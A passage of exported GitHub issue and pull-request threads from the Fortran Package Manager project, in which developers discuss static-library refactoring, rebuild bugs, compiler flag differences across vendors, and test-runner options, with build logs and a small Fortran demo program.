[documentation] table to specify the tools specify the sources and the tools required."
                }
            ]
        },
        {
            "number": 226,
            "user": "everythingfunctional",
            "date": "2020-11-02 20:35:33+00:00",
            "title": "Fix rebuilding executables when libraries change",
            "text": "Fix #222",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-04 15:02:27+00:00",
                    "text": "This is a very small change which clearly fixes the issue, so I will now merge."
                }
            ]
        },
        {
            "number": 225,
            "user": "LKedward",
            "date": "2020-11-01 15:25:45+00:00",
            "title": "Refactor backend for static libraries",
            "text": "The current implementation doesn't have any internal distinction between a source file and a build target; this was for parsimony in getting the fortran version working, but it limits the backend.\nIn this PR there is now a separate internal representation for build targets. This simplifies the backend and now allows static libraries to be built (Resolves #217).\nIn summary:\n\nsource level semantics (modules used/provided etc) are in type(srcfile_t)\nbuild level semantics (dependencies, object type) are in type(build_target_t)\n\nThis refactoring is also necessary for #212 which will come in a separate PR.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-06 06:56:44+00:00",
                    "text": "So far:Getting excitingly close to a fully functional fortran version!\n\nI have some test programs with dependencies for just the test programs.\nI cannot seem to get test.dependencies to work. For example, for the\nsimple modules in (\"https://github.com/urbanjost/M_calculator.git\")\nI have to have the dependency specifed in the [library] section instead\nof in in [test.dependensices.]\n[M_calculator](https://github.com/urbanjost/M_calculator.git)\nis a simple project that demonstrates this.\n# If I remove this this repository does not build properly\nM_msg          = { git = \"https://github.com/urbanjost/M_msg.git\" }\nname = \"M_calculator\"\nversion = \"0.1.0\"\nlicense = \"Public Domain\"\nauthor = \"John S. Urban\"\nmaintainer = \"urbanjost@comcast.net\"\ncopyright = \"2020 John S. Urban\"\ndescription = \"basic numeric expression parser\"\n\n[library]\nsource-dir=\"src\"\n[dependencies]\n#### If I remove this it does not build properly\nM_msg          = { git = \"https://github.com/urbanjost/M_msg.git\" }\n\n[[test]]\nname=\"runTests\"\nsource-dir=\"test/test_suite\"\nmain=\"test_suite_M_calculator.f90\"\n[test.dependencies]\nM_msg          = { git = \"https://github.com/urbanjost/M_msg.git\" }\n\n[[executable]]\nname=\"compute\"\nsource-dir=\"app\"\nmain=\"compute.f90\"\ncannot use multi-module file as a remote dependency\nAlso, I can build a file with multiple modules in it, but when I use\nthose modules as a remote dependency for another module it fails.\nIs that intentional?\nfix \"run\" and \"test\" to simplify testing\nIn the new version since all the applications are built in the app/ and test/ directory the\nrun_cmd() and test_cmd() need the following changes. I could make a separate PR for the\nchange but it makes testing far easier and is a trivial change:\ndiff --git a/fpm/src/fpm.f90 b/fpm/src/fpm.f90\n-            fname=join_path('build',release_name,package%executable(i)%source_dir,package%executable(i)%name)\n+            fname=join_path('build', release_name, 'app', package%executable(i)%name)\n\n-                    fname=join_path('build',release_name,package%executable(i)%source_dir,package%executable(i)%name)\n+                    fname=join_path('build', release_name, 'app', package%executable(i)%name)\n\n-            fname=join_path('build',release_name,package%test(i)%source_dir,package%test(i)%name)\n+            fname=join_path('build', release_name, 'test', package%test(i)%name)\n\n-                    fname=join_path('build',release_name,package%test(i)%source_dir,package%test(i)%name)\n+                    fname=join_path('build', release_name, 'test', package%test(i)%name)"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-06 08:42:16+00:00",
                    "text": "Thanks for the feedback @urbanjost, as always this is really useful!\n\nI cannot seem to get test.dependencies to work.\n\nYes this was an oversight when I implemented the remote dependencies; I implemented the [dev-dependencies] syntax but not the [test.dependencies] syntax. You should be able to get your test packages working by using [dev-dependencies] for the time-being. I've opened #228 to track this.\n\nAlso, I can build a file with multiple modules in it, but when I use those modules as a remote dependency for another module it fails. Is that intentional?\n\nThis is not intentional and is a bug. I haven't been able to reproduce with a basic example, can you provide more information on the failure?\n\nIn the new version since all the applications are built in the app/ and test/ directory the\nrun_cmd() and test_cmd() need the following changes.\n\nThanks yes this is a simple fix which I should implement in this PR."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-06 11:43:49+00:00",
                    "text": "Hi @urbanjost, please can you see #229 for my refactoring of the run and test commands which fixes the problem you mentioned. In summary, #229 uses information from the model%targets structure to find executable paths instead of reconstructing the paths in the run command subroutine."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-10 13:54:45+00:00",
                    "text": "Many thanks for the feedback and reviews everyone, I will now merge."
                }
            ]
        },
        {
            "number": 224,
            "user": "awvwgk",
            "date": "2020-11-01 10:46:39+00:00",
            "title": "Create a reference for the package manifest",
            "text": "This PR creates a reference of the current specification of the package manifest for fpm, using the bootstrap fpm, Fortran fpm and the fpm-registry to collect all supported entries and sections. This allows to define specs independently from the actual implementation in the bootstrap or Fortran version or the additional constraints imposed by the fpm-registry.\nThis augments the PACKAGING.md, which is more a user guide to packaging with fpm.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:24:13+00:00",
                    "text": "This is definitely something we needed. Thanks for putting it together."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-04 15:04:59+00:00",
                    "text": "Thanks for reviewing everyone and many thanks @awvwgk. With three approvals I will now merge."
                }
            ]
        },
        {
            "number": 223,
            "user": "awvwgk",
            "date": "2020-10-31 11:13:52+00:00",
            "title": "Compiler support and recognition",
            "text": "Came up in #220.\nAt some point we might have to determine which compiler is used with fpm, therefore I tried to collect some information on the various Fortran compilers around. I only have first hand access to a fraction of them, so most of these information are second hand from HPC documentations or build systems.\nFeel free to correct or add information to this table. Alternatively, we could move this table to the wiki.\n\n\n\nvendor\nFortran compiler\nC compiler\nModule output directory\nModule include directory\nOpenMP\nFree for OSS\n\n\n\n\nGnu\ngfortran\ngcc\n-J\n-I\n-fopenmp\n\u2714\ufe0f\n\n\nIntel\nifort\nicc\n-module\n-I\n-qopenmp\n\u2714\ufe0f\n\n\nIntel (Windows)\nifort\nicc\n/module:path\n/I\n/Qopenmp\n\u2714\ufe0f\n\n\nIntel oneAPI\nifx\nicx\n-module\n-I\n-qopenmp\n\u2714\ufe0f\n\n\nPGI\npgfortran\npgcc\n-module\n-I\n-mp\n\u2714\ufe0f\n\n\nNVIDIA\nnvfortran\nnvc\n-module\n-I\n-mp\n\u2714\ufe0f\n\n\nLLVM flang\nflang\nclang\n-module\n-I\n-mp\n\u2714\ufe0f\n\n\nLFortran\nlfortran\n---\n?\n?\n?\n\u2714\ufe0f\n\n\nLahey/Futjitsu\nlfc\n?\n-M\n-I\n-openmp\n?\n\n\nNAG\nnagfor\n?\n-mdir\n-I\n-openmp\n\u274c\n\n\nCray\ncrayftn\ncraycc\n-J\n-I\n-homp\n?\n\n\nIBM\nxlf90\n?\n-qmoddir\n-I\n-qsmp\n\u2714\ufe0f\n\n\nOracle/Sun\n?\n?\n-moddir=\n-M\n-xopenmp\n?\n\n\nSilverfrost FTN95\nftn95\n?\n?\n/MOD_PATH\n?\n?\n\n\nElbrus\n?\nlcc\n-J\n-I\n-fopenmp\n?\n\n\nHewlett Packard\n?\n?\n?\n?\n?\ndiscontinued\n\n\nWatcom\n?\n?\n?\n?\n?\ndiscontinued\n\n\nPathScale\n?\n?\n-module\n-I\n-mp\ndiscontinued\n\n\nG95\n?\n?\n-fmod=\n-I\n-fopenmp\ndiscontinued\n\n\nOpen64\n?\n?\n-module\n-I\n-mp\ndiscontinued\n\n\nUnisys\n?\n?\n?\n?\n?\ndiscontinued\n\n\n\nFor now it might be sufficient to only support GCC, since we only guarantee that fpm works when compiled with GCC right now.\nFirst class compiler support requires access to the compiler to allow testing in a CI environment, some of the commercial compilers have free versions for open source developers available.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 11:22:33+00:00",
                    "text": "Overview of compilers known by the meson build system can be found here, actual implementation is here."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-31 11:34:25+00:00",
                    "text": "Awesome, thanks @awvwgk this is super useful! I've edited to include Intel differences on Windows."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:27:06+00:00",
                    "text": "Thanks for putting this together. It will be invaluable as we try to support more compilers."
                },
                {
                    "user": "scivision",
                    "date": "2020-11-06 20:29:24+00:00",
                    "text": "I have asked NAG to have free access for use in maintaining NAG support for Meson build system, but never got a reply. I did get replies to other email topics with NAG.\nIntel (non-oneAPI) is also free for OSS on Windows\nIBM XL is generally available at no cost assuming you have an IBM Power system to run it on."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-22 11:15:20+00:00",
                    "text": "I found that Ubuntu Focal (ubuntu-20.04 image) has a flang package available."
                },
                {
                    "user": "scivision",
                    "date": "2020-11-22 19:19:53+00:00",
                    "text": "This Ubuntu flang possibly came from Debian. It might be quite out of date i.e. syntax bugs that might make issues for modern Fortran packages."
                }
            ]
        },
        {
            "number": 222,
            "user": "LKedward",
            "date": "2020-10-30 16:03:15+00:00",
            "title": "Rebuild not working properly after #213",
            "text": "Since 4443986 (#213), changes to library sources do not trigger a rebuild of apps and tests.\n\nTo reproduce and demonstrate:\ncd /tmp/\ngit clone git@github.com:fortran-lang/fpm.git\ncd fpm/\ncd bootstrap/\nstack install\ncd ../example_packages/hello_complex\nfpm run\necho \"!\" >> source/greet_m.f90 \nfpm run\n\nThe last fpm run command will rebuild the library, but not the apps or tests.\nOutput\n\n~$ cd /tmp/\n/tmp$ git clone git@github.com:fortran-lang/fpm.git\nCloning into 'fpm'...\nremote: Enumerating objects: 206, done.\nremote: Counting objects: 100% (206/206), done.\nremote: Compressing objects: 100% (101/101), done.\nremote: Total 2830 (delta 114), reused 178 (delta 100), pack-reused 2624\nReceiving objects: 100% (2830/2830), 568.50 KiB | 1.49 MiB/s, done.\nResolving deltas: 100% (1569/1569), done.\n/tmp$ cd fpm/\n/tmp/fpm$ cd bootstrap/\n/tmp/fpm/bootstrap$ stack install\nDEPRECATED: The package at Repo from https://gitlab.com/everythingfunctional/hedge.git, commit 1c6cba3b5f8e52cf317f2421aaca13a0ddab4e92 in subdir . does not include a cabal file.\nInstead, it includes an hpack package.yaml file for generating a cabal file.\nThis usage is deprecated; please see https://github.com/commercialhaskell/stack/issues/5210.\nSupport for this workflow will be removed in the future.\n\nBuilding all executables for `fpm' once. After a successful build of all of them, only specified executables will be rebuilt.\nfpm> configure (lib + exe)\nConfiguring fpm-0.1.0.0...\nWarning: 'extra-source-files: ../README.md' is a relative path outside of the\nsource tree. This will not work when generating a tarball with 'sdist'.\nWarning: 'extra-source-files: ../ChangeLog.md' is a relative path outside of\nthe source tree. This will not work when generating a tarball with 'sdist'.\nfpm> build (lib + exe)\nPreprocessing library for fpm-0.1.0.0..\nBuilding library for fpm-0.1.0.0..\n[1 of 4] Compiling BuildModel\n[2 of 4] Compiling Build\n[3 of 4] Compiling Fpm\n[4 of 4] Compiling Paths_fpm\nPreprocessing executable 'fpm' for fpm-0.1.0.0..\nBuilding executable 'fpm' for fpm-0.1.0.0..\n[1 of 2] Compiling Main\n[2 of 2] Compiling Paths_fpm\nLinking .stack-work/dist/x86_64-linux/Cabal-2.4.0.1/build/fpm/fpm ...\nfpm> copy/register\nInstalling library in /tmp/fpm/bootstrap/.stack-work/install/x86_64-linux/624da27b4edec5b2a9682661e54b7da94a4de40ca862562a4526c1ddd57e9117/8.6.5/lib/x86_64-linux-ghc-8.6.5/fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh\nInstalling executable fpm in /tmp/fpm/bootstrap/.stack-work/install/x86_64-linux/624da27b4edec5b2a9682661e54b7da94a4de40ca862562a4526c1ddd57e9117/8.6.5/bin\nRegistering library for fpm-0.1.0.0..\nCopying from /tmp/fpm/bootstrap/.stack-work/install/x86_64-linux/624da27b4edec5b2a9682661e54b7da94a4de40ca862562a4526c1ddd57e9117/8.6.5/bin/fpm to /home/lk12325/.local/bin/fpm\n\nCopied executables to /home/lk12325/.local/bin:\n- fpm\n\n\n/tmp/fpm$ cd ../example_packages/hello_complex\n/tmp/fpm/example_packages/hello_complex$ fpm run\n# gfortran (for build/gfortran_debug/hello_complex/source_subdir_constants.f90.o build/gfortran_debug/hello_complex/subdir_constants.mod)\n# gfortran (for build/gfortran_debug/hello_complex/source_farewell_m.f90.o build/gfortran_debug/hello_complex/farewell_m.mod)\n# gfortran (for build/gfortran_debug/hello_complex/source_greet_m.f90.o build/gfortran_debug/hello_complex/greet_m.mod)\n# ar (for build/gfortran_debug/hello_complex/libhello_complex.a)\nar: creating build/gfortran_debug/hello_complex/libhello_complex.a\n# gfortran (for build/gfortran_debug/apps/say_hello/apps_say_hello_say_Hello.f90.o)\n# gfortran (for build/gfortran_debug/apps/say_hello/say_Hello)\n# gfortran (for build/gfortran_debug/apps/say_goodbye/apps_say_goodbye_say_goodbye.f90.o)\n# gfortran (for build/gfortran_debug/apps/say_goodbye/say_goodbye)\n# gfortran (for build/gfortran_debug/tests/greet/tests_greet_greet_test.f90.o)\n# gfortran (for build/gfortran_debug/tests/greet/greet_test)\n# gfortran (for build/gfortran_debug/tests/farewell/tests_farewell_farewell_test.f90.o)\n# gfortran (for build/gfortran_debug/tests/farewell/farewell_test)\n Hello, World!\n Goodbye, World!\n/tmp/fpm/example_packages/hello_complex$ echo \"!\" >> source/greet_m.f90 \n/tmp/fpm/example_packages/hello_complex$ fpm run\n# gfortran (for build/gfortran_debug/hello_complex/source_greet_m.f90.o build/gfortran_debug/hello_complex/greet_m.mod)\n Hello, World!\n Goodbye, World!",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-01 15:08:27+00:00",
                    "text": "@everythingfunctional, are you able to look into this?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 15:30:48+00:00",
                    "text": "I'm pretty sure I know exactly what happened. Forgot a need archives in the build rules. I'm super busy today, but I should have time tomorrow to fix it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-03 22:57:11+00:00",
                    "text": "Also note, the build system is comparing file hashes for rebuilds, so adding a comment to the end of the file won't cause the .o or .mod files to be different, stopping the rebuild after that one step."
                }
            ]
        },
        {
            "number": 221,
            "user": "everythingfunctional",
            "date": "2020-10-28 19:50:37+00:00",
            "title": "Test and executable runner options",
            "text": "Allow a way of specifying a command to be used to run the executable(s) or test(s).\nAn example of where this might be particularly useful (practically necessary) is\nfpm test --runner \"valgrind --leak-check=full --error-exitcode=1\"\n\nto run the tests while looking for memory leaks.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-28 19:51:48+00:00",
                    "text": "Note, this should be merged after #220"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-28 21:43:25+00:00",
                    "text": "While #220 makes it effectively impossible to know the path to the produced executable (which is something we were trying to avoid specifying anyway), this, combined with the -- ARGS functionality should remove most users' needs to know it anyway. Whatever command a user would like to run with the executable is now constructable via fpm as [optional runner ]path/to/executable[ optional args] constructed via fpm run [--runner \"optional runner\"] --target executable [-- optional args]"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-30 19:44:24+00:00",
                    "text": "As mentioned the  --flag option does not allow multiple compiler options. A small errata is to change addional ==> additional in the help text. Wondering if for a cross-mounted installation if the UUID for the directory should include some kind of system identifier as well; so that if I compile on a big-endian and small-endian machine from the same directory, for example, that I get two different output directories. Did not look carefully at how the key is generated, but right now using the same flags in a different order generates a different output file  (ie.  fpm run A --flag -Wextra --flag -Wall uses a different output file than fpm run A --flag -Wall --flag Wextra).  So one reason not to allow multiple arguments with a single --flag switch might be to more easily identify the flags are the same.  One big difference still remaining between the Fortran and bootstrap version is that fpm new A with no explicit switches defaults to no directories for the bootstrap version and being equivalent to fpm new --lib --app --test in the Fortran version.  Good with it as an Alpha feature for people to experiment with; but not being able to specify more than one flag at a time becomes very verbose when trying to duplicate the switches used by --release, for example.  Assuming the unique key based on options (a clever idea) is not reversible it is somewhat hard after you have generated a bunch of binaries to remember which is which  (A profiling version, a version with coarray set to one processor and set to multiple processors, ...) so maybe some kind of labeling mechanism or recording of the options used would seem useful. So good with both #220 and #221 as alpha versions but hoping something emerges to resolve those questions as people try  it.  A footnote is that to add a similiar option to the Fortran version would either take a restriction that a flag value has to start with a space if the first character would otherwise be a dash or a slight change to the CLI interface would be needed but would be relatively straight-forward.  So unless requiring --flag \" -option value -option value(s) ...\" is too unintuitive\nthat would be non-trivial to add.  Adding something like --flag 'NAME: -opt [value] -opt[value]' would let you provide a tag for the options and prevent the problem with non-numeric values starting with a dash, however.\nPS:  For testing I found the intrinsics for echoing the compiler version and options useful. Last I checked a lot of compilers still did not implement that; but maybe each build directory could have a little program built into it that called those functions and maybe even uname -a and date information (although doing that portably right now is an issue).  Just for reference I like the output to be a little more readable from gfortran so I used to following for some of the testing; albeit I admit to a bit of overkill just to parse on spaces:\nprogram demo_compiler_version\nuse, intrinsic :: iso_fortran_env, only : compiler_version, compiler_options\nimplicit none\ncharacter(len=:),allocatable :: args(:)\ncharacter(len=4096)          :: line\ninteger                      :: i\nwrite(line,'(a)')compiler_options()\n   write (*,'(a)')repeat('=',80)\n   print '(a)', &\n    'This file was compiled by ', &\n    compiler_version(),           &\n    'using the options'\n   call split(line,args)\n   write(*,'(a)')(trim(args(i)),i=1,size(args))\n   write (*,'(a)')repeat('=',80)\ncontains\nsubroutine split(input_line,array)\ncharacter(len=*),intent(in)              :: input_line\ncharacter(len=:),allocatable,intent(out) :: array(:)\ninteger,allocatable         :: ibegin(:), iterm(:)\ncharacter(len=*),parameter  :: dlim=' '//char(9)//char(10)//char(11)//char(12)//char(13)//char(0)\ninteger :: n, ii, icount, ilen, i10, i20, i30, icol, idlim, ifound, inotnull, imax\n   idlim=len(dlim)\n   n=len(input_line)+1\n   allocate(ibegin(n),iterm(n))\n   ibegin(:)=1\n   iterm(:)=1\n   icount=0\n   inotnull=0\n   imax=0\n   ilen=len(input_line)\n   if(ilen.gt.0)then\n      icol=1\n      INFINITE: do i30=1,ilen,1\n         ibegin(i30)=icol\n         if(index(dlim(1:idlim),input_line(icol:icol)).eq.0)then\n            iterm(i30)=ilen\n            do i10=1,idlim\n               ifound=index(input_line(ibegin(i30):ilen),dlim(i10:i10))\n               if(ifound.gt.0) iterm(i30)=min(iterm(i30),ifound+ibegin(i30)-2)\n            enddo\n            icol=iterm(i30)+2\n            inotnull=inotnull+1\n         else\n            iterm(i30)=icol-1\n            icol=icol+1\n         endif\n         imax=max(imax,iterm(i30)-ibegin(i30)+1)\n         icount=i30\n         if(icol.gt.ilen) exit INFINITE\n      enddo INFINITE\n   endif\n   allocate(character(len=imax) :: array(inotnull))\n   ii=1\n   do i20=1,icount\n      if(iterm(i20).lt.ibegin(i20))then\n      else\n         array(ii)=input_line(ibegin(i20):iterm(i20))\n         ii=ii+1\n      endif\n   enddo\nend subroutine split\nend program demo_compiler_version"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-30 19:53:29+00:00",
                    "text": "PS:  Was not clear from --target option that \"fpm run A B C\" still worked or whether you could have multiple names on --target or specify --target more than once. Wondering if with --target you can combine it with command options instead of using -- to something like fpm run --target  'A -x 10.3 -y 20' might work.  Was wondering why the change to having an option like --target when the original just asked for a list of executable names."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-31 01:41:49+00:00",
                    "text": "I keep running into cases where using xargs(1) makes it easier as not all commands take the filenames at the end.\nSince I do not know of an equivalent command to xargs(1) on non-GNU/Unix platforms (is there one?) I am wondering if something like the mask that you can do with xargs(1) would be useful, where if the --runner command has some special string in it like %FILE that gets replaced with the filename?  This option allows for testing things that might become options like installing executables in a specified directory, listing app names when you have multiple ones, thinking about how profiling or debuggers might be incorporated, and so on. Would be useful to do on source files as well as executables. Works well in GNU/Unix \"toolbox\" environment, not sure if it works as well in MSWindows environment.\nfpm run --runner 'ls -l'\n fpm run --runner file\n fpm run --runner time\n fpm run --runner sum\n fpm run --runner 'valgrind --leak-check=full -s'\n# get list of pathnames\n fpm run --runner 'echo'\n# debugger\n fpm run --runner 'gdb'\n# combine echo and xargs\n fpm run --runner 'echo'|xargs -iXX cp XX /tmp/bin/\n# copy with name at end of command (people usually use \"cp FILE DIR/\")\n fpm run --runner 'cp --target-directory=/tmp/bin/ --update'\n# make nice little table of names that can be run or tested\n fpm test --runner echo|xargs -iXX basename XX|xargs -n 5|column -t\n# install binaries in specified directory\nfpm run --runner 'env VERSION_CONTROL=numbered install -D --owner=$LOGNAME --preserve-timestamps --backup --suffix=`date +%Y%M%D` --group=$(id -nG) --mode=0711 --target-directory=/tmp/bin/fpm --verbose --preserve-context'"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:12:08+00:00",
                    "text": "Yeah, I'm not totally enamored with the verbosity of having to specify every flag with --flag in front of it. I'm not sure exactly what the solution is yet though.\nFor recording compiler version and options, we could just put a log file at the base of the build directory that identifies them. Just printing the exact strings used to generate the hashes would probably be sufficient for most cases.\nfpm run A B C to specify multiple targets never worked, but I could definitely be persuaded to allow for multiple --target."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-12 19:00:23+00:00",
                    "text": "With #220 merged in, this is now ready as well. I don't think I've seen any significant objections, so I'd like to merge it sooner rather than later, but I'll give a day or two for anybody to take another look"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-16 17:56:21+00:00",
                    "text": "Having seen no objections, and indications that the Fortran version will soon have this same functionality, I'm going to go ahead and merge."
                }
            ]
        },
        {
            "number": 220,
            "user": "everythingfunctional",
            "date": "2020-10-28 18:44:02+00:00",
            "title": "Compiler and flags",
            "text": "This slightly modifies the command line options of the bootstrap version to be more in line with the Fortran version, and adds options to the bootstrap version to allow specifying the compiler and flags.\nNote: There is a change to the name of the build directory. It now includes hashes that are unique to compiler version and flags used. This is in some ways a breaking change, because even our CI scripts were reliant on the name(s) we were using, even though we never promised this would be consistent or guaranteed.\nI view this partly as just an example of how this could be done that our users can play with, not necessarily exactly how it should be implemented in the Fortran version.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-28 20:11:13+00:00",
                    "text": "The main implications for the way the logic is currently implemented is that, if you specify anything other than the exact string \"gfortran\" as the compiler (which is the default value), then no default flags are provided. Also, if you specify any compiler flags, then only those specified are actually used (aside from ones like -c, -o, etc that are included as required for the build to work). I'm open to suggestions about if there is a better way to do this, but my feeling is that whatever is specified on the command line should override any other settings. I believe that's how most tools usually work."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-28 20:27:48+00:00",
                    "text": "Actually, hold on merging this one for a bit. The -- args part isn't working right yet."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-28 21:20:25+00:00",
                    "text": "Ok, fpm test -- args --to test now works properly"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-29 02:20:22+00:00",
                    "text": "A vexing issue. Fortran and C compilers in many cases are primarily a \"text file to machine instructions\" converter, but usually require special flags for profiling, loading auxiliary libraries, special flags best for use with debuggers, ... but usually have little or no support for packaging and IDE types of interfaces (or fpm would not be needed).  So ideally there needs to be a way to specify compiler commands right in the TOML file so a package can use things like X11 libraries or readline or any other libraries installed on a machine.  And yet there will always be a special case where you want direct control of compiler options. Should we just supply the file names in dependency order for that case? Should we just allow you to specify a \"compiler\" name and assume that iit s a script you have set up to do the compile that just needs the filenames? Compiler switches are more standarized than at any time in the past but even the assumed parameters like -c and -o and -I and -J may not do quite what you want when automatically built.\nSo far in the h-fpm version the packager can create a custom build with a toml.mk file and the use of a few environment variables but there is nothing on the user side that is equivalent on the command line. And even with the commands put into the TOML files it is not clear if it would work to have a base compile command and supplimental keyword/option pairs like \"debugger\" and \"profile\" or whether it is just best to allow \"complete\" commands to be specified with different names. So I think we need a way to do this through the TOML file so special options can be packaged; I think some things might best be handled by just supplying the filenames in the project with a more complete \"fpm build -list\" output ;\nbut can still think of scenarios where a compiler option is needed. Not sure that should not be done by specifying a build script name like the h-fpm toml file allows with toml.mk though. But cannot think of any \"perfect\" solution so it seems like, as you said, this is a good idea to add and try.\nSo far I haven't seen anything better in any package manager I looked at that would apply to Fortran (or C/C++). My gut feeling is that we need to have something that is \"packageable\" too and this is more like a back door to let you specify on-the-fly options more than a way to \"make a distributable package\" but I have been wanting something like this almost every time I try to make an FPM package myself; at least during development. Just getting it pulled down and built now. So here I am just - but I think it sounds like something to try.trying to capture my first thoughts about alternatives before I get too involved in the nuts and bolts of how this works just to further the discussion"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-29 02:36:22+00:00",
                    "text": "maybe something else to think about would be a --dryrun that would just echo all the execute_system_command commands instead of doing them to let you create a script for a custom build or a switch to write a \"fpm.mk\" file are supplemental approachs?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-29 08:44:17+00:00",
                    "text": "I think --release and --flag should be mutually exclusive after trying it a bit. -- and --flag -value have worked, which are both tricky to implement.  Is it intended that a --flag only take one option?  Should I be able to say --flag '-g -O3 -p ....'?\n\"--release --compiler NAME\" makes sense but --release presumes certain options and using --flag seems to set options to just those specified so I was not sure what \" --release --flag OPTION\" would do;\nfpm build --release --compiler f95 --flag '-g' --flag '-O3'"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-29 16:26:43+00:00",
                    "text": "@urbanjost , thanks for your comments. As illustrated by #112, #191 the \"packaging\" of compiler options is rather complicated, and this effectively just sidesteps all of that to provide something people can play with for now.\nYes, --dry-run would be a useful option. I can probably get to it within the next few weeks. Not sure exactly how easy it will be yet.\nAlso, I agree that --release and --flag should be mutually exclusive, I just haven't added in the error checking logic yet. In fact, anything other than --compiler gfortran should invalidate --release also, to make the internal logic more apparent to the user."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-29 16:32:53+00:00",
                    "text": "@LKedward , I agree with you that hash values should probably be output in hex. I'll see if I can figure out to do that shortly.\nThat's disappointing about ifort. I was really hoping the -I and -J flags were the \"standard\" way of specifying module locations. It very much complicates the build logic. As far as specifying all the flags at once, something like this should work --flag '-Wall -Wextra ...', since multiple flags are just stuck together with strings and stuck as-is into the command."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-29 17:01:17+00:00",
                    "text": "To make the module output directory automatic fpm should be able to detect the compiler it is using. There seem to be at least five six different commands for modules (according to meson: https://github.com/mesonbuild/meson/blob/master/mesonbuild/compilers/fortran.py), with -module being the most common.\n\nIntel, PGI, Pathscale, Flang: -module\nG95: -fmod\nGnu: -J\nSun: -moddir=\nNAG: -mdir\nLahey: -M"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-29 17:15:48+00:00",
                    "text": "@awvwgk , eesh. I was hoping we wouldn't have to detect which compiler. It's probably better that we do, as it will allow us to always provide a default set of flags.\nAlso, those are the flags for \"where to put the produced *.mod\" files. Do you know the equivalent flags for \"where else to look for *.mod\" files?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-29 17:27:10+00:00",
                    "text": "The include directory command is of course not consistent between compiler. Fortunately, most compilers use -I with the exception of the Sun Fortran compiler, which is using -M, and the Lahey compiler, which uses --mod instead, as far as I can see."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-29 17:54:13+00:00",
                    "text": "Are -c and -o universal?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-29 17:59:15+00:00",
                    "text": "Looks like they are. I have access to PGI/NVIDIA, Intel, NAG and Lahey, so I could run some tests or provide some example outputs for --version if required. Fortunately, we don't have to learn everything from scratch, we should take the knowledge embedded in CMake and/or meson for the compiler handling."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-29 18:10:02+00:00",
                    "text": "Great. Definitely useful to try and leverage the CMake and meson examples. Hopefully that info isn't too difficult to tease out of their code base or documentation."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-29 18:12:51+00:00",
                    "text": "I linked the Fortran compilers meson knows about above, they are all well contained in one file and the Python code is readable enough. For CMake I'm not volunteering to search for this information."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-30 09:15:10+00:00",
                    "text": "As far as specifying all the flags at once, something like this should work --flag '-Wall -Wextra ...', since multiple flags are just stuck together with strings and stuck as-is into the command.\n\nHmm, okay it looks like fpm is passing the flag string to the shell command including quotes:\n$ fpm build --flag '-Wall -Wextra'\nCommand line: gfortran -c -Jbuild/gfortran_70f5c1d2b5b6190e_459e958fab3e1c6b/fhash '-Wall -Wextra' -o build/gfortran_70f5c1d2b5b6190e_459e958fab3e1c6b/fhash/src_fhash_fnv.f90.o src/fhash_fnv.f90\nExit code: 1\nStderr:\ngfortran: error: unrecognized command-line option \u2018-Wall -Wextra\u2019\n\n..."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 11:24:01+00:00",
                    "text": "@everythingfunctional I created #223 to track the available compilers and their different flavours of command line flags."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:21:23+00:00",
                    "text": "I'm not particularly enamored with it either, since you're correct that it gets quite cumbersome, but I don't know of a much better solution. I don't think we want to specify them in the fpm.toml file until we've developed some compiler agnostic way of doing it, and know exactly how they interact between packages."
                },
                {
                    "user": "ianabc",
                    "date": "2020-11-07 20:29:06+00:00",
                    "text": "This is exciting to see, passing multiple --flag options covers my use-case for now (coarrays)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-09 09:07:32+00:00",
                    "text": "After looking around a bit I found cargo-rustc, I like the idea of cargo to separate a build and a compile mode, maybe we should copy this approach and implement a separate command (fpm compile?), which allows this for fpm, but leave the build command deterministic by only using arguments from the package manifest (see #112)."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-09 21:09:06+00:00",
                    "text": "@awvwgk , that's an interesting idea. However, we would need additional options to run and test to allow specifying that they run the version(s) built with such a command."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-09 23:45:49+00:00",
